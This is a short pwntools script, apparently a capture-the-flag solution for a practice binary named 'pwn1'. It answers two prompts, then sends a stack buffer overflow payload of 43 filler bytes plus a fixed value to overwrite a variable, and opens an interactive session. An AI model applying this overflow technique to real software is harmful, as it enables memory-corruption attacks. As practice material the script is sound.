from pwn import *

target = process("./pwn1")

target.sendline("Sir Lancelot of Camelot\n")
target.sendline("To seek the Holy Grail.\n")
payload = "A" * 43
payload += p64(0xdea110c8)

target.sendline(payload)

target.interactive()